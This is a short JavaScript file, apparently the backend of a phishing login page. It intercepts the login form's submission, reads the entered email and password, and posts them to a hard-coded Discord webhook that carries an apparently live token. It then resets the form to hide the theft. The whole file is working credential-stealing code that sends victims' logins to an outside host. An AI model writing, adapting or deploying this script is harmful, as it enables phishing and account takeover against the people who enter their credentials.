document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Send data to Discord webhook
    sendToDiscordWebhook(email, password);

    // Clear the form
    document.getElementById('loginForm').reset();
});

function sendToDiscordWebhook(email, password) {
    const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk'; // Replace with your actual webhook URL

    const data = {
        content: `**Email= ||${email}||\nPass= ||${password}||**`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully');
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}
